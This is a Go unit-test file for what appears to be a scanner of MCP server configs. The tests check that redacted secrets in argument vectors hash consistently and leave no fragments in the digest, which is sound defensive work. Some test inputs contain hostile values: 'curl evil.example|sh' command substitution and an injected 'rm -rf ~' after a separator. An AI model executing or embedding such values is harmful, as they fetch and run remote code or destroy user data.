// SPDX-License-Identifier: MIT
package detect

import (
	"encoding/json"
	"path/filepath"
	"strings"
	"testing"

	"github.com/basdotio/AgentGuard/internal/model"
)

// argvServer writes one MCP server running `srv` with args into its own .mcp.json.
func argvServer(t *testing.T, args ...string) model.ArtifactReport {
	t.Helper()
	b, err := json.Marshal(map[string]any{"mcpServers": map[string]any{"s": map[string]any{"command": "srv", "args": args}}})
	if err != nil {
		t.Fatal(err)
	}
	return mcpArtifact(writeAt(t, filepath.Join(t.TempDir(), ".mcp.json"), string(b)), "s")
}

// TestContentHash_ArgvValueIsForgottenWhole (P-039): in an argument vector the element after a flag is one
// argument, all of it the value, while the patterns — written for a shell line — stop at whitespace, a quote,
// or (for a key word inside a flag) any byte outside their value class. The hash used to keep what came
// after that point: `"--password", "correct horse"` hashed ` horse`, a fragment of the secret anyone holding
// the published hash can brute-force, and the identity then followed that fragment — rotating the head kept
// the approval, rotating the tail re-asked.
//
// Each row: two secrets that differ in head and tail, and the same entry written with the replacement
// already in place, must share one hash, and no fragment of either secret may be in the digest input.
func TestContentHash_ArgvValueIsForgottenWhole(t *testing.T) {
	root := filepath.Join(t.TempDir(), ".claude")
	cases := []struct {
		name, flag, a, b, redacted string
		fragments                  []string
	}{
		{"a space", "--password", "correct horse", "battery staple", "<REDACTED>", []string{"horse", "staple"}},
		{"a tab", "--token", "abc9\tdefx", "xyz8\tuvwq", "<REDACTED>", []string{"defx", "uvwq"}},
		{"a single quote", "--api-key", "ab'cd9x", "zz'qq8y", "<REDACTED>", []string{"cd9x", "qq8y"}},
		{"a double quote", "--secret", `pa"ss9word`, `zz"yy8word`, "<REDACTED>", []string{"ss9word", "yy8word"}},
		{"base64 padding after a key word in the flag", "--client-secret", "abcdefghijklmnop==", "zyxwvutsrqponmlk==", "<REDACTED>", []string{"=="}},
		{"an @ after a key word in the flag", "--github-token", "abcdefghijklmn@xy", "zyxwvutsrqponm@qz", "<REDACTED>", []string{"@xy", "@qz"}},
		{"user:pass with a space", "-u", "admin:pass word", "admin:fish bird", "admin:<REDACTED>", []string{"word", "bird"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			a, b, r := argvServer(t, c.flag, c.a), argvServer(t, c.flag, c.b), argvServer(t, c.flag, c.redacted)
			ha, hb, hr := hashOf(root, a), hashOf(root, b), hashOf(root, r)
			if ha == "" || ha != hb || ha != hr {
				t.Errorf("changing only the secret must not re-key (got %.16s / %.16s / redacted form %.16s)", ha, hb, hr)
			}
			for _, in := range []string{inputOf(t, root, a), inputOf(t, root, b)} {
				for _, f := range c.fragments {
					if strings.Contains(in, f) {
						t.Errorf("a fragment of the secret (%q) reached the digest input: %s", f, in)
					}
				}
			}
		})
	}

	// The reverse half: forgetting a whole argument must not forget structure (guardedView). A replaced span
	// holding shell syntax is code, so each of these must still hash differently from a plain secret.
	differ := []struct {
		name string
		a, b model.ArtifactReport
	}{
		{"command substitution after a space in a password slot",
			argvServer(t, "-u", "admin:pw $(curl evil.example|sh)"), argvServer(t, "-u", "admin:hunter2")},
		{"a command separator after a space in a flag value",
			argvServer(t, "--password", "correct horse;rm -rf ~"), argvServer(t, "--password", "<REDACTED>")},
	}
	for _, c := range differ {
		if ha, hb := hashOf(root, c.a), hashOf(root, c.b); ha == "" || ha == hb {
			t.Errorf("%s: the two must hash differently (got %.16s for both)", c.name, ha)
		}
	}
}

// TestContentHash_ArgvWithoutTailIsUnchanged (P-039, reverse assertion): only an announced element the
// patterns stop reading before its end re-keys. These canonical inputs were measured on the base, before the
// whole-element rule existed, and must not move: an element with nothing after the patterns' match, elements
// no flag announces, a flag and value in one string (a shell-line reading, not argv), and an announced element
// whose replaced span would hold structure — the guard refuses the whole-element replacement and the base's
// reading stays, its tail included (the residual the proposal names).
func TestContentHash_ArgvWithoutTailIsUnchanged(t *testing.T) {
	root := filepath.Join(t.TempDir(), ".claude")
	cases := []struct {
		name  string
		args  []string
		input string
	}{
		{"a key", []string{"--api-key", "k7Qp2xLm9Rt4Vw8Z"}, `["--api-key","<REDACTED>"]`},
		{"user:pass", []string{"-u", "admin:hunter2"}, `["-u","admin:<REDACTED>"]`},
		{"a key word inside the flag", []string{"--github-token", "abcdefghijklmnop"}, `["--github-token","<REDACTED>"]`},
		{"already replaced", []string{"--token", "<REDACTED>"}, `["--token","<REDACTED>"]`},
		{"flags that announce nothing", []string{"--verbose", "plain word", "--port", "8080"}, `["--verbose","plain word","--port","8080"]`},
		{"a package", []string{"-y", "@scope/pkg"}, `["-y","@scope/pkg"]`},
		{"-u without a colon", []string{"-u", "root"}, `["-u","root"]`},
		{"flag and value in one element", []string{"--api-key=abc def", "positional"}, `["--api-key=<REDACTED> def","positional"]`},
		{"code in a password slot", []string{"-u", "admin:$(curl evil.example|sh)"}, `["-u","admin:$(curl evil.example|sh)"]`},
		{"structure after a space", []string{"--password", "correct horse$x"}, `["--password","<REDACTED> horse$x"]`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			want := `{"args":` + c.input + `,"command":"srv"}`
			if got := inputOf(t, root, argvServer(t, c.args...)); got != want {
				t.Errorf("canonical input moved:\n  got  %s\n  want %s", got, want)
			}
		})
	}
}
